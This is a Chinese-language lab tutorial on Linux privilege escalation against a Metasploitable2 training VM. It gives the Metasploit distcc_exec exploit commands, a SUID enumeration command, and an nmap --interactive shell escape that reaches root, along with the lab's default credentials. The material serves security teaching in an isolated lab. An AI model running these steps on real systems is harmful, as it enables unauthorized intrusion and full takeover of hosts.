---
show: step
version: 1.0
enable_checker: true
---
# 目标 Linux 服务器提权

## 一、实验简介

#### 1.1 实验介绍

本实验主要介绍渗透入一个 Linux 主机后进行权限提升。网上的服务器提权，多为对 windows 系统的提权教程。本实验将进行对 Linux 操作系统进行提权。在该实验中，我们依旧基于实验楼环境下 Kali 的 MSF 终端，在渗透目标主机 Metasploitable2 成功后，不是 root 的权限下，对非 root 用户进行提权实验。

#### 1.2 实验知识点

本实验使用的环境为 Kali Linux 操作系统，一些基本的 Linux 操作命令是必须要熟悉。本实验中，我们将会涉及到的知识点有：

- Linux 基本操作命令
- MSF 终端下的攻击流程
- 使用目标主机漏洞进行提权
- 验证是否提权成功

#### 1.3 实验环境

实验楼采用的实验环境包含两台虚拟机，分别是攻击机和靶机：

攻击机：Kali Linux 2.0 虚拟机，主机名是 kali，IP 地址为 192.168.122.101，默认用户名密码为 root/toor
靶机：Metasploitable2 虚拟机，主机名是 target，IP 地址为 192.168.122.102，默认用户密码为 msfadmin/msfadmin

本实验在实验楼的环境下进行。在实验楼的环境中，采用的实验环境包含两台虚拟机，分别是攻击机和靶机，攻击机和靶机的账户和密码参数分别如下：

| 主机   | 主机名            | 用户名     | 密码       |
| ------ | ----------------- | ---------- | ---------- |
| 攻击机 | `Kali Linux 2.0`  | `root`     | `toor`     |
| 靶机   | `Metasploitable2` | `msfadmin` | `msfadmin` |


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480402741165.png-wm)

## 二、环境启动

#### 2.1 实验环境启动

首先使用 `virsh list` 命令查看当前环境中虚拟机的列表和状态，注意需要使用 sudo，另外需要加上参数 `--all` 才会显示所有关机状态的虚拟机。

然后我们使用 `virsh start` 命令启动虚拟机，再次查看状态虚拟机已经进入 running 状态：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890565816.png-wm)

注意由于虚拟机启动需要时间，大概要等一分钟左右我们就可以使用 SSH 访问两台虚拟机了。

首先使用 SSH 连接到 Kali，我们大部分的攻击操作都需要在 Kali 虚拟机中进行，注意用户名root，密码 toor 是不显示的，使用命令 `ssh root@kali` 即可，因为当前实验环境中已经把 IP 地址和主机名的对应写入到了 `/etc/hosts` 文件中，避免输入不好记的 IP 地址：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1479890676283.png-wm)

现在两台实验环境都已经启动，我们可以开始渗透测试实验了。

## 三、攻击进入目标主机

下面我们将会学习攻击进入目标主机。

### 3.1 利用 Distcc 漏洞进入目标主机

利用 Distcc 漏洞这个实验，在上一节中，我们已经实践过了。在从实验楼登录 Kali  终端后，依次输入如下命令，攻陷所要渗透的目标主机：

```
# 打开 postgresql 服务
sudo service postgresql start

# 打开终端 MSF
sudo msfconsole

# 使用 use 命令对模块进行使用
use exploit/unix/misc/distcc_exec
 
# 利用 set 命令，设置渗透目标主机参数 RHOST 为 192.168.122.102
set RHOST 192.168.122.102

# 使用命令 exploit 命令，进行渗透攻击
exploit
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483509960404.png-wm)


由攻击的 gif 图可以看出，目前已经成功建立了管道连接。其中值得注意的是，在攻击结束之后，会建立一个 `session` 保存当前的会话。gif 动图中显示的是，`Command shell session 4 opened` 是因为运行了四次攻击。

正常情况下，第一次输入攻击命令，你所见到的是：`Command shell session 1 opened`。

### 3.2 查看当前用户的权限

在成功地建立了管道连接之后，接下来可以对目标主机进行各种操作。在现实生产过程中，当渗透进入一个目标主机之后，我们首先要查看当前用户是不是 `root` 用户。利用命令 `whoami` 和 `id ` 可以查看当前用户是否是拥有管理员权限：

```
# 查看当前用户
whoami

# 输入命令 id 
id
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483510378675.png-wm)


由上图可以看出，当前登录的用户为 `daemon`，id 并非为 0 ，0 为管理员用户，并非像我们之前那样，直接获取 root 权限。在真正的渗透测试过程中，非 root 权限的情况很多，这时候，为了完全掌控所渗透的目标主机，我们需要做的事情，就是提高当前登录用户的权限，简而言之，就是提权。


实验到了这里，我们就要对操作系统进行提权。

## 四、漏洞提权

下面我们将会学习漏洞提权。

### 4.1 提权准备

在渗透成功之后，一般情况下我们需要对目标靶机系统的详细信息做一个评估。在本实验中渗透成功之后，我们当前的用户为低权限的非 root 用户，此时需要做如下工作，进行提权准备：

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480405131027.png-wm)

在终端中输入如命令，用以查看系统的发行版本，如图所示：

```
# 查看系统的发行版本
lsb_release -a
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480405308859.png-wm)

由图可以看出，我们渗透的目标主机为 Ubuntu 操作系统。版本号为 Ubuntu 8.04 是属于比较老的一个版本。接着我们再输入 `uname -a`，查看操作系统的内核版本：

```
# 查看操作系统的内核版本
uname -a
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480405546281.png-wm)

接着进行比较关键的一步，查找可以用的 SUID 文件来提权，在终端中，继续输入命令：

```
find / -perm -u=s -type f 2>/dev/null
```

这里同学们如果觉得实验的命令过长，可以通过复制本命令，然候粘贴到实验的剪切板，接着在实验楼中，通过 `ctrl` + `shit` + `v` 进行粘贴。如果一切顺利，你将会看到如果列表：


![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480405790093.png-wm)

在上面的列表中，可以发现有一个 nmap ，一般来说，低版本的 nmap 会有一个可以提权的漏洞，我们可以试试先查看 namp 的版本。也并不是每个都有漏洞，在渗透攻击的过程中，正常情况下，我们需要对多个可能出现漏洞的地方进行尝试，这样才能够找出漏洞。

好了，让我们来查看下 nmap 的版本信息，在已经通过 distcc 漏洞攻入靶机的终端中，输入如下命令：

```
# 查看 namp 的版本信息
# 先回车键按一次，方便查看输出内容

/usr/bin/nmap --version
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1483510778353.png-wm)


注意单词的拼写，特别是 `nmap`。


### 4.2 使用 nmap 进行提权

该版本的 nmap 也是一个非常老的版本，通过 nmap 选项，能够让用户执行 Shell 命令，在终端中，我们输入如下命令：

```
# 让用户自行 Shell 命令
/usr/bin/nmap --interactive
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480406522209.png-wm)

接着在命令终端中，输入如下命令：

```
#  输入!sh 进行提权
nmap> !sh 
```

接着 `nmap>` 消失，此时，再次使用 `whoami` 命令查看当前用户是谁：

```
# 查看当前的用户是谁
whoami
```

![图片描述](https://dn-simplecloud.shiyanlou.com/uid/212008/1480406813156.png-wm)

好了，现在你就是 `root`， `root` 就是你了，提权成功！

目标靶机 Metasploitable2 上的 namp 版本比较老旧，其中的版本漏洞由于目标主机的管理员安全意识比较薄弱，没有及时地更新这些漏洞软件。这些漏洞因为逻辑错误等原因，非常容易被黑客利用，并进行相应的提权。

## 五、总结

该提权实验，首先通过 MSF 终端，对目标主机进行渗透攻击，接着获取一个非 root 的权限，接着再通过查看操作系统的版本信息，内核信息，以及查找可以用的 SUID 文件来提权。综合这些信息后，我们就对漏洞进行一个评估，接着尝试通过可能存在的漏洞，进行 Linux 服务器提权，从而达到掌控目标机器的目的。总结一下该实验的知识点：

- Linux 基本操作命令
- MSF 终端下的攻击流程
- 使用目标主机漏洞进行提权
- 验证是否提权成功

## 六、推荐阅读

在做本实验的课程的同时，推荐大家一些阅读文档，增加对 Linux 提权信息的理解。以下为推荐文档的链接地址：

> http://docs.kali.org/policy/kali-linux-root-user-policy

Youtube 视频（可选，需要翻墙），不影响本次实验的操作，只是增加大家的课外阅读，加深对 Kali 的理解：

> https://www.youtube.com/watch?v=-ib3wzto5m0

## 七、课后作业

完成以下作业，巩固实验知识，在进行动手实验的同时，还要提升自己的理论知识：

- 对本实验的操作，亲自动手实现一遍
- 理解 Linux 服务提权的过程
- 搜索下看是否还有其他的提权漏洞可以利用？

对于不懂的问题，都可随时在[实验楼问答](https://www.shiyanlou.com/questions)中提出，与老师和同学一起交流。